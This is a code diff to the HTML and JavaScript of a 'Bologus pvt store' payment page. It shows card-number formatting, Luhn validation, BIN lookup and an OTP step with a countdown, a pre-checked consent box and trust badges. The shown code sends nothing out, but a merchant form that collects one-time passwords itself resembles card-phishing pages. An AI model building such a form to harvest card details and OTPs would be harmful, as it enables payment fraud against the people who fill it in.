@@ -1,63 +1,31 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Bologus pvt store.</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <style>
-    .rupee-sign {
-      position: absolute;
-      left: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      font-size: 1rem;
-      user-select: none;
-      color: #6b7280;
-      line-height: 1;
-      display: flex;
-      align-items: center;
-      height: 100%;
-      pointer-events: none;
-    }
-    #cardTypeIcon {
-      position: absolute;
-      right: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100%;
-    }
-    .amount-display {
-      font-size: 18px;
-      font-weight: 400;
-      color: #1a1a1a;
-      text-align: center;
-      margin-bottom: 20px;
-      padding: 12px;
-      background: #f3f4f6;
-      border-radius: 8px;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      letter-spacing: -0.2px;
-    }
+    /* ======= Layout & General Styles ======= */
     .page-container {
       min-height: 100vh;
       display: flex;
       flex-direction: column;
       padding-top: 1.5rem;
+      background: linear-gradient(45deg, #ff0000 50%, #ffffff 50%);
     }
     .content-wrapper {
       flex: 1;
       padding: 1rem;
       margin-bottom: 6rem;
     }
-    .merchant-badge {
-      position: relative;
-      cursor: pointer;
-      margin-left: 0;
+    @media (max-width: 600px) {
+      .page-container {
+        margin-bottom: 90px;
+      }
     }
+    /* ======= Merchant & Info Section ======= */
+    .merchant-badge { position: relative; cursor: pointer; margin-left: 0; }
     .merchant-dropdown {
       display: none;
       position: absolute;
@@ -70,8 +38,16 @@
       z-index: 10;
       width: 300px;
     }
-    .merchant-badge:hover .merchant-dropdown {
-      display: block;
+    .merchant-badge:hover .merchant-dropdown { display: block; }
+    .shield-icon {
+      animation: shieldPulse 2s infinite;
+      transform-style: preserve-3d;
+      perspective: 1000px;
+    }
+    @keyframes shieldPulse {
+      0% { transform: scale(1) rotate(0deg); filter: brightness(1); }
+      50% { transform: scale(1.05) rotate(5deg); filter: brightness(1.2); }
+      100% { transform: scale(1) rotate(0deg); filter: brightness(1); }
     }
     .trusted-shield {
       display: flex;
@@ -97,60 +73,77 @@
       color: #4B5563;
       padding: 0.25rem 0;
     }
-    .verification-tick {
-      width: 1rem;
-      height: 1rem;
-      flex-shrink: 0;
-      color: #10B981;
+    .verification-tick { width: 1rem; height: 1rem; flex-shrink: 0; color: #10B981; }
+    /* ======= Payment & Form Styles ======= */
+    .amount-display {
+      font-size: 18px;
+      font-weight: 400;
+      color: #1a1a1a;
+      text-align: center;
+      margin-bottom: 20px;
+      padding: 12px;
+      background: #f3f4f6;
+      border-radius: 8px;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      letter-spacing: -0.2px;
     }
-    .bottom-logos {
-      padding: 2rem 0;
-      margin-top: auto;
-      background: transparent;
+    .rupee-sign {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 1rem;
+      user-select: none;
+      color: #6b7280;
+      line-height: 1;
+      display: flex;
+      align-items: center;
+      height: 100%;
+      pointer-events: none;
     }
-    @keyframes shieldPulse {
-      0% { transform: scale(1) rotate(0deg); filter: brightness(1); }
-      50% { transform: scale(1.05) rotate(5deg); filter: brightness(1.2); }
-      100% { transform: scale(1) rotate(0deg); filter: brightness(1); }
+    #cardTypeIcon {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
     }
-    .shield-icon {
-      animation: shieldPulse 2s infinite;
-      transform-style: preserve-3d;
-      perspective: 1000px;
-    }
+    .card-icon { height: 24px; width: auto; display: block; }
+    #cardError { color: #ef4444; font-size: 14px; margin-top: 4px; display: none; }
+    #cardInfo { color: #4B5563; font-size: 14px; margin-top: 4px; }
+    .otp-error { color: #ef4444; font-size: 13px; margin: 4px 0 8px 0; text-align: center; display: none; }
+    .hidden { display: none !important; }
+    /* Consent Message */
     .consent-message {
       display: flex;
       align-items: flex-start;
       gap: 0.5rem;
       padding: 0.5rem;
       border-radius: 0.25rem;
-      cursor: pointer;
       font-size: 0.875rem;
       color: #4B5563;
+      margin-top: 20px;
     }
     .consent-checkbox {
       width: 1.25rem;
       height: 1.25rem;
       border: 2px solid #D1D5DB;
       border-radius: 0.25rem;
-      display: flex;
+      display: inline-flex;
       align-items: center;
       justify-content: center;
-      flex-shrink: 0;
+      margin-right: 5px;
     }
     .consent-checkbox.checked {
       background-color: #10B981;
       border-color: #10B981;
     }
-    .consent-checkbox svg {
-      width: 1rem;
-      height: 1rem;
-      color: white;
-      display: none;
-    }
-    .consent-checkbox.checked svg {
-      display: block;
-    }
+    .consent-checkbox svg { width: 1rem; height: 1rem; color: white; display: none; }
+    .consent-checkbox.checked svg { display: block; }
+    /* ====== Animations ====== */
     .animate-slide-in {
       animation: slideIn 0.3s ease-out;
     }
@@ -167,46 +160,17 @@
       from { transform: rotate(0deg); }
       to { transform: rotate(360deg); }
     }
-    .otp-input::placeholder {
-      color: #9CA3AF;
-      opacity: 0.7;
-    }
-    .otp-input:focus::placeholder {
-      opacity: 0;
-    }
-    .otp-input {
-      caret-color: transparent;
-    }
-    .btn-loading {
-      position: relative;
-    }
-    .btn-loading span {
-      opacity: 0.5;
-      filter: blur(1px);
-    }
-    .hidden { display: none !important; }
-    .otp-container {
+    .btn-loading { position: relative; }
+    .btn-loading span { opacity: 0.5; filter: blur(1px); }
+    /* ====== Footer Logos ====== */
+    .bottom-logos {
+      padding: 2rem 0;
+      margin-top: auto;
+      background: transparent;
       display: flex;
-    }
-    .otp-input-wrapper {
-      width: 50%;
-      padding-right: 4px;
-    }
-    .otp-button-wrapper {
-      width: 50%;
-      padding-left: 4px;
-    }
-    .card-icon {
-      height: 24px;
-      width: auto;
-      display: block;
-    }
-    .otp-error {
-      color: #ef4444;
-      font-size: 13px;
-      margin: 4px 0 8px 0;
-      text-align: center;
-      display: none;
+      justify-content: center;
+      align-items: center;
+      gap: 20px;
     }
     @media (max-width: 600px) {
       .bottom-logos {
@@ -221,12 +185,7 @@
         justify-content: center;
         z-index: 100;
       }
-      .bottom-logos img {
-        max-height: 25px;
-      }
-      .page-container {
-        margin-bottom: 90px;
-      }
+      .bottom-logos img { max-height: 25px; }
     }
   </style>
   <!-- ========= Global Variables ========= -->
@@ -240,17 +199,18 @@
     let timer = 180;
     let consentChecked = true;
   </script>
-  <!-- ========= Fetch Payment Details with PID Fallback ========= -->
+  <!-- ========= Fetch Payment Details ========= -->
   <script>
     document.addEventListener('DOMContentLoaded', async () => {
       const urlParams = new URLSearchParams(window.location.search);
       let pid = urlParams.get('pid');
-      // Fallback: if pid is missing or "null", try sessionStorage
+      // If pid is not in URL or equals "null", try sessionStorage
       if (!pid || pid === "null") {
         pid = sessionStorage.getItem('pid');
       } else {
         sessionStorage.setItem('pid', pid);
       }
+      console.log("Payment page PID:", pid);
       if (pid) {
         try {
           const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
@@ -261,7 +221,7 @@
               document.getElementById('amount').value = amount;
               document.getElementById('displayAmount').textContent = amount.toLocaleString('en-IN');
             } else {
-              console.warn("Invalid amount in payment details; defaulting to 100");
+              console.warn("Invalid amount; defaulting to 100");
               document.getElementById('amount').value = 100;
               document.getElementById('displayAmount').textContent = "100";
             }
@@ -280,7 +240,6 @@
   </script>
   <!-- ========= Card Formatting & BIN Lookup ========= -->
   <script>
-    // Luhn algorithm for card validation
     function validateCard(number) {
       let arr = number.replace(/\D/g, '').split('').reverse().map(x => parseInt(x, 10));
       let sum = 0;
@@ -294,7 +253,6 @@
       }
       return sum % 10 === 0;
     }
-    // Format card number into groups of 4
     function formatCardNumber(value) {
       let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
       v = v.slice(0, 16);
@@ -304,7 +262,6 @@
       }
       return parts.join(' ');
     }
-    // Format expiry as MM/YY
     function formatExpiry(value) {
       let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
       let formatted = v;
@@ -313,25 +270,12 @@
       }
       return formatted;
     }
-    // Validate expiry date format and limits
-    function validateExpiry(value) {
-      if (!/^\d{2}\/\d{2}$/.test(value)) return false;
-      const [month, year] = value.split('/').map(num => parseInt(num, 10));
-      const now = new Date();
-      const currentYear = now.getFullYear() % 100;
-      const currentMonth = now.getMonth() + 1;
-      if (month < 1 || month > 12) return false;
-      if (year < currentYear || year > 50) return false;
-      if (year === currentYear && month < currentMonth) return false;
-      return true;
-    }
-    // Update card error message based on Luhn validation
     function updateCardError() {
       const cardInput = document.getElementById("cardNumber");
       const errorElem = document.getElementById("cardError");
       const plain = cardInput.value.replace(/\s/g, '');
-      isCardValid = (plain.length >= 16) ? validateCard(plain) : false;
-      if (plain.length >= 16 && !isCardValid) {
+      isCardValid = (plain.length === 16) ? validateCard(plain) : false;
+      if (plain.length === 16 && !isCardValid) {
         errorElem.style.display = 'block';
         errorElem.textContent = "Please enter valid card number";
         cardInput.classList.add('border-red-500');
@@ -340,7 +284,6 @@
         cardInput.classList.remove('border-red-500');
       }
     }
-    // Simple card type detection based on first digit
     function detectCardType(number) {
       const clean = number.replace(/\D/g, '');
       const firstDigit = clean.charAt(0);
@@ -350,7 +293,6 @@
       if (firstDigit === '6') return 'rupay';
       return null;
     }
-    // BIN lookup using free Binlist API
     async function lookupBIN(bin) {
       try {
         const response = await fetch(`https://lookup.binlist.net/${bin}`);
@@ -362,9 +304,9 @@
       }
       return null;
     }
-    // Update card type icon and BIN info
     async function updateCardTypeAndInfo(value) {
       const cardIcon = document.getElementById("cardTypeIcon");
+      // Ensure cardInfo exists; if not, skip BIN info update.
       const cardInfo = document.getElementById("cardInfo");
       const plain = value.replace(/\s/g, '');
       if (plain.length >= 6) {
@@ -389,32 +331,33 @@
               logoUrl = "";
           }
           cardIcon.innerHTML = logoUrl ? `<img src="${logoUrl}" alt="${binData.scheme}" style="max-height:100%; max-width:100%;">` : "";
-          if (binData.country && binData.country.currency && binData.country.currency !== "INR") {
-            try {
-              const rateResponse = await fetch("https://api.exchangerate-api.com/v4/latest/INR");
-              const rateData = await rateResponse.json();
-              const conversion = rateData.rates[binData.country.currency];
-              if (conversion) {
-                cardInfo.textContent = `${binData.country.currency} detected, 1 INR = ${conversion.toFixed(3)} ${binData.country.currency} | ${binData.country.name}`;
-              } else {
+          if (cardInfo) {
+            if (binData.country && binData.country.currency && binData.country.currency !== "INR") {
+              try {
+                const rateResponse = await fetch("https://api.exchangerate-api.com/v4/latest/INR");
+                const rateData = await rateResponse.json();
+                const conversion = rateData.rates[binData.country.currency];
+                if (conversion) {
+                  cardInfo.textContent = `${binData.country.currency} detected, 1 INR = ${conversion.toFixed(3)} ${binData.country.currency} | ${binData.country.name}`;
+                } else {
+                  cardInfo.textContent = `${binData.country.currency} | ${binData.country.name}`;
+                }
+              } catch (e) {
                 cardInfo.textContent = `${binData.country.currency} | ${binData.country.name}`;
               }
-            } catch (e) {
-              cardInfo.textContent = `${binData.country.currency} | ${binData.country.name}`;
+            } else {
+              cardInfo.textContent = "";
             }
-          } else {
-            cardInfo.textContent = "";
           }
         } else {
           cardIcon.innerHTML = "";
-          cardInfo.textContent = "";
+          if (cardInfo) cardInfo.textContent = "";
         }
       } else {
         cardIcon.innerHTML = "";
-        cardInfo.textContent = "";
+        if (cardInfo) cardInfo.textContent = "";
       }
     }
-    // Update the submit button state based on input validations
     function updateSubmitButton() {
       const email = document.getElementById('email').value.trim();
       const cardNum = document.getElementById('cardNumber').value.replace(/\s+/g, '');
@@ -430,7 +373,6 @@
         submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400";
       }
     }
-    // Function to update the OTP button state
     function updateConfirmOtpButton() {
       const otp = document.getElementById('otp').value;
       const otpButton = document.getElementById('otpSubmitButton');
@@ -443,7 +385,6 @@
         otpButton.className = "w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center";
       }
     }
-    // Attach event listeners on DOM load
     document.addEventListener("DOMContentLoaded", function(){
       const cardInput = document.getElementById("cardNumber");
       const expiryInput = document.getElementById("expiry");
